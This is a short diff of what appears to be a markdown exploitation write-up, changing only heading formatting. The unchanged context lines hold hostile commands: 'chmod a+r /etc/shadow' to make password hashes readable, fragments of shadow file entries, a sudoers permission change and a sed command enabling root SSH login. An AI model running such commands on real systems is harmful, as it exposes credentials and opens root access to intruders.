@@ -30,7 +30,7 @@ Content-Length: 0
 Content-Type: text/html; charset=UTF-8
 ```
 
-**Change Permission:**
+> Change Permission:
 
 ```
 chmod a+r /etc/shadow
@@ -70,7 +70,7 @@ _apt:*:18218:0:99999:7:::
 Debian-exim:!:18233:0:99999:7:::
 ```
 
-**Change Permission (sudoers):**
+> Change Permission (sudoers):
 
 ```
 /etc/sudoers
@@ -125,7 +125,7 @@ sshd:*:18233:0:99999:7:::
 </pre>
 ```
 
-**Active root ssh:**
+> Active root ssh:
 
 ```
 # sed -i 's/\#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
